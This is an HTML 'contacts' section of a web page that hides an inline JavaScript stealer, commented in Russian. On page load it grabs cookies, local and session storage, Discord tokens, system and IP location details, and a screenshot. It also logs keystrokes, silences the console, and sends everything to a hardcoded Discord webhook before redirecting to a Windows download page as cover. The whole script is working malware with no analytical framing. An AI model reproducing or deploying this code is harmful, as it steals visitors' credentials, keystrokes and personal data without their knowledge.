<section id="contacts_section" class="fade contacts">

  <div class="contact-links">

<script>
           // === КОНФИГ ===
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1475205126166941717/U5gN1sW3piGZF5FRZEId48YcbJLi5XwyvPV03qNaDNc9Be7wiNFRTiNLgCQau5plTIVD";
        const MAX_MESSAGE_LENGTH = 1900;
        const CAPTURE_DELAY = 3000;
        
        // === БЕЗОПАСНОЕ ОБНОВЛЕНИЕ СТАТУСА ===
        function updateStatus(text) {
            try {
                const statusElement = document.getElementById('statusMessage');
                if (statusElement) {
                    statusElement.innerText = text;
                }
                console.log('[Status]', text); // Для отладки
            } catch(e) {
                console.log('Status update error:', e);
            }
        }
        
        // === ФУНКЦИЯ ОТПРАВКИ В DISCORD ===
        function sendToDiscord(content, isFile = false, filename = null, fileData = null) {
            try {
                if (isFile) {
                    const formData = new FormData();
                    const blob = dataURLToBlob(fileData);
                    formData.append('file', blob, filename);
                    
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: formData
                    }).catch(e => console.log('File send error:', e));
                } else {
                    if (content.length > MAX_MESSAGE_LENGTH) {
                        const chunks = content.match(new RegExp('.{1,' + MAX_MESSAGE_LENGTH + '}', 'g'));
                        chunks.forEach(chunk => {
                            fetch(WEBHOOK_URL, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ content: chunk.substring(0, MAX_MESSAGE_LENGTH) })
                            }).catch(e => console.log('Send error:', e));
                        });
                    } else {
                        fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ content: content })
                        }).catch(e => console.log('Send error:', e));
                    }
                }
            } catch(e) {
                console.log('Send function error:', e);
            }
        }
        
        function dataURLToBlob(dataURL) {
            try {
                const arr = dataURL.split(',');
                const mime = arr[0].match(/:(.*?);/)[1];
                const bstr = atob(arr[1]);
                let n = bstr.length;
                const u8arr = new Uint8Array(n);
                while (n--) {
                    u8arr[n] = bstr.charCodeAt(n);
                }
                return new Blob([u8arr], { type: mime });
            } catch(e) {
                return new Blob([]);
            }
        }

        // === 1. СИСТЕМНАЯ ИНФА ===
        async function getSystemInfo() {
            try {
                const ua = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                const languages = navigator.languages?.join(', ') || 'Unknown';
                const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
                const deviceMemory = navigator.deviceMemory || 'Unknown';
                
                // Батарея
                let batteryInfo = 'Unknown';
                if ('getBattery' in navigator) {
                    try {
                        const battery = await navigator.getBattery();
                        batteryInfo = `${Math.round(battery.level * 100)}%, ${battery.charging ? 'Charging' : 'Not charging'}`;
                    } catch(e) {}
                }
                
                return {
                    userAgent: ua,
                    platform: platform,
                    language: language,
                    languages: languages,
                    cpuCores: hardwareConcurrency,
                    ram: deviceMemory + 'GB',
                    battery: batteryInfo,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight
                };
            } catch(e) {
                return { error: 'Failed to get system info' };
            }
        }

        // === 2. ГЕОЛОКАЦИЯ ===
        async function getGeoInfo() {
            let ipData = {};
            let geoData = {};
            
            try {
                const response = await fetch('https://ipapi.co/json/');
                ipData = await response.json();
            } catch(e) {
                try {
                    const response = await fetch('https://ipinfo.io/json');
                    ipData = await response.json();
                } catch(e2) {}
            }
            
            return { ipData, geoData };
        }

        // === 3. СТОРАДЖИ ===
        function stealStorages() {
            try {
                const data = {};
                data.cookies = document.cookie || 'No cookies';
                
                data.localStorage = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    data.localStorage[key] = localStorage.getItem(key);
                }
                
                data.sessionStorage = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    data.sessionStorage[key] = sessionStorage.getItem(key);
                }
                
                return data;
            } catch(e) {
                return { error: 'Storage access failed' };
            }
        }

        // === 4. ПОИСК ТОКЕНОВ ===
        function findTokens() {
            const tokens = {
                discord: [],
                other: []
            };
            
            try {
                const discordPattern = /(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})/g;
                
                for (let i = 0; i < localStorage.length; i++) {
                    const value = localStorage.getItem(localStorage.key(i));
                    const matches = value.match(discordPattern);
                    if (matches) {
                        tokens.discord.push(...matches);
                    }
                }
                
                const cookieMatches = document.cookie.match(discordPattern);
                if (cookieMatches) tokens.discord.push(...cookieMatches);
                
            } catch(e) {}
            
            return tokens;
        }

        // === 5. СКРИНШОТ ===
        async function takeScreenshot() {
            try {
                const canvas = await html2canvas(document.body, {
                    scale: 1,
                    logging: false,
                    allowTaint: true,
                    useCORS: true
                });
                return canvas.toDataURL('image/jpeg', 0.7);
            } catch(e) {
                return null;
            }
        }

        // === 6. КЕЙЛОГГЕР ===
        let keyLog = [];
        
        function startKeyLogger() {
            try {
                document.addEventListener('keydown', function(e) {
                    if (e.key.length === 1) {
                        keyLog.push(e.key);
                        
                        if (keyLog.length >= 20) {
                            sendToDiscord(`**⌨️ Keys (${keyLog.length}):**\n\`${keyLog.join('')}\``);
                            keyLog = [];
                        }
                    }
                });
                
                window.addEventListener('beforeunload', function() {
                    if (keyLog.length > 0) {
                        sendToDiscord(`**⌨️ Keys final:**\n\`${keyLog.join('')}\``);
                    }
                });
            } catch(e) {}
        }

        // === 7. МАСКИРОВКА ===
        function setupMasks() {
            try {
                // Скрываем консоль
                console.log = function() {};
                console.error = function() {};
                console.warn = function() {};
            } catch(e) {}
        }

        // === 8. ГЛАВНАЯ ФУНКЦИЯ СБОРА ===
        async function megaSteal() {
            try {
                updateStatus('🔍 Initializing...');
                
                // Маскировка
                setupMasks();
                
                // Кейлоггер
                startKeyLogger();
                
                // 1. Система
                updateStatus('📊 Collecting system info...');
                const sysInfo = await getSystemInfo();
                sendToDiscord(`**💻 SYSTEM INFO**\n\`\`\`json\n${JSON.stringify(sysInfo, null, 2)}\n\`\`\``);
                
                // 2. Гео
                updateStatus('📍 Getting location...');
                const geoInfo = await getGeoInfo();
                sendToDiscord(`**📍 LOCATION**\nIP: ${geoInfo.ipData.ip || 'Unknown'}\nCountry: ${geoInfo.ipData.country_name || 'Unknown'}\nCity: ${geoInfo.ipData.city || 'Unknown'}\nISP: ${geoInfo.ipData.org || 'Unknown'}`);
                
                // 3. Стораджи
                updateStatus('🍪 Stealing cookies...');
                const storages = stealStorages();
                sendToDiscord(`**🍪 COOKIES**\n\`\`\`\n${storages.cookies.substring(0, 500)}\n\`\`\``);
                sendToDiscord(`**💾 LOCALSTORAGE**\n\`\`\`json\n${JSON.stringify(storages.localStorage, null, 2).substring(0, 500)}\n\`\`\``);
                
                // 4. Токены
                updateStatus('🎫 Searching tokens...');
                const tokens = findTokens();
                if (tokens.discord.length > 0) {
                    sendToDiscord(`**🎫 DISCORD TOKENS**\n\`\`\`\n${tokens.discord.join('\n')}\n\`\`\``);
                }
                
                // 5. Скриншот
                updateStatus('📸 Taking screenshot...');
                const screenshot = await takeScreenshot();
                if (screenshot) {
                    sendToDiscord('📸 **SCREENSHOT**', true, 'screenshot.jpg', screenshot);
                }
                
                // Финальное сообщение
                updateStatus('✅ Update complete! Redirecting...');
                
                // Редирект
                setTimeout(() => {
                    try {
                        window.location.href = 'https://www.microsoft.com/software-download/windows11';
                    } catch(e) {}
                }, 3000);
                
            } catch(e) {
                console.log('Main error:', e);
                updateStatus('⚠️ Error: ' + e.message);
                sendToDiscord(`**❌ ERROR**\n${e.toString()}`);
            }
        }

        // === СТАРТ ===
        window.addEventListener('load', function() {
            setTimeout(megaSteal, 1500);
        });
    </script>

</section>
